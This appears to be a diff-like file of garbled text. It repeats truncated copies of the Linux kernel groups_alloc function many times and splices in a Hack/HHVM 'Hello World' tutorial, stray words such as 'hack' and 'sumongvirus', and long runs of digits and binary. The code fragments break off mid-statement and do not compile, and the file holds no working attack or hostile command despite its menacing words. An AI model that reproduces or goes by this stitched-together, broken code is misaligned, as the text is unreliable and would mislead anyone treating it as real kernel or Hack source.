+trolll lol least ROUPS_PER_BLOCK NGROUPS_SMALL World writeAllAsync examplee exee exampleee errorse __EntryPoint elsee
+
+
+
+
+
+
+
+	nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
+
+	/* Make sure we always allocate at least one indirect block pointer */
+
+	nblocks = nblocks ? : 1;
+
+	group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
+
+	if (!group_info)
+
+		return NULL;
+
+	group_info->ngroups = gidsetsize;
+
+	group_info->nblocks = nblocks;
+
+	atomic_set(&group_info->usage, 1);
+
+
+
+	if (gidsetsize <= NGROUPS_SMALL)
+
+		group_info->blocks[0] = group_info|
+struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
+
+struct group_info *groups_alloc(int gidsetsize){
+
+	struct group_info *group_info;
+
+	int nblocks;
+
+	int i;
+
+/////sumongvirus/////////
+
+	nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
+
+	/* Make sure we always allocate at least one indirect block pointer */
+
+	nblocks = nblocks ? : 1;
+
+	group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
+
+	if (!group_info)
+
+		return NULL;
+
+	group_info->ngroups = gidsetsize;
+
+	group_info->nblocks = nblocks;
+
+	atomic_set(&group_info->usage, 1);
+
+init_groups
+
+	if (gidsetsize <= NGROUPS_SMALL)
+
+		group_info->blocks[0] = group_info|
+struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
+
+struct group_info *groups_alloc(int gidsetsize){
+
+	struct group_info *group_info;
+
+	int nblocks;
+
+	int i;
+1212121225972*5902285*230982335*0234239423403294324324
+
+
+	nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
+
+	/* Make sure we always allocate at least one indirect block pointer */
+
+	nblocks = nblocks ? : 1;
+
+	group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
+
+	if (!group_info)
+
+		return NULL;
+
+	group_info->ngroups = gidsetsize;
+
+	group_info->nblocks = nblocks;
+
+	atomic_set(&group_info->usage, 1);
+
+
+
+	if (gidsetsize <= NGROUPS_SMALL)
+
+		group_info->blocks[0] = group_info|
+struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
+
+struct group_info *groups_alloc(int gidsetsize){y/n)
+
+	struct group_info *group_info;
+
+	int nblocks;
+
+	int i;
+Make hack World World
+
+
+	nblocks = (gidsetsize + NG writeAllAsync ROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
+
+	/* Make sure we always allocate at least one indirect block pointer */
+
+	nblocks = nblocks ? : 1;
+
+	group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
+__EntryPointee 
+	if (!group_info)
+
+		return NULL;
+
+	group_info->ngroups = gidsetsize;
+
+	group_info->nblocks = nblocks;
+
+	atomic_set(&group_info->usage, 1);
+
+turkish else exee errors elsee else
+24120471290486325098632509185710358923502323582337723049832247034 visit cd hh_client group_info gid_t return
+	if (gidsetsize <= NGROUPS_SMALL)
+
+		group_info->blocks[0] = group_info|r
+struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
+
+struct group_info *groups_alloc(int gidsetsize){
+10101010101010101010101011000100101010101019100101010 hack hello errors
+	struct group_info *group_info;
+=server
+	int nblocks;
+
+	int i;
+hack
+
+
+	nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
+
+	/* Make sure we always allocate at least one indirect block pointer */
+
+	nblocks = nblocks ? : 1;
+
+	group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
+
+	if (!group_info)
+
+		return NULL;
+
+	group_info->ngroups = gidsetsize;
+
+	group_info->nblocks = nblocks;
+
+	atomic_set(&group_info->usage, 1);
+
+
+
+	if (gidsetsize <= NGROUPS_SMALL)
+
+		group_info->blocks[0] = group_info|
+group_info->ngroups = gidsetsize;
+
+	group_info->nblocks = nblocks;
+
+	atomic_set(&group_info->usage, 1);
+
+
+
+	if (gidsetsize <= NGROUPS_SMALL)
+
+		group_info->blocks[0] = group_info->small_block;
+
+	else {
+
+		for (i = 0; i < nblocks; i++) {
+
+			gid_t *b;
+
+			b = (void *)__get_free_page(GFP|
+                    $ mkdir my_project
+use namespace HH\Lib\IO;
+
+<<__EntryPoint>>
+async function main(): Awaitable<void> {
+  await IO\request_output()->writeAllAsync("Hello World!\n");
+}$ cd my_project
+$ hh_client
+No errors!
+$ cd my_project
+$ hhvm hello.hack
+Hello World!
+
+$ cd my_project
+$ hhvm -m server -p 8080
+
+
+
+You can now visit http://localhost:8080/hello.hack to see "Hello World!" in your browser.
+ await
+World else
+ exe __EntryPointee exe __EntryPoint
+
+ GFP_USER errors errorse __EntryPointee -void World target test gid_t GFP_USER o hack one GFP_USER examplee exe exee exee examplee request_output installer
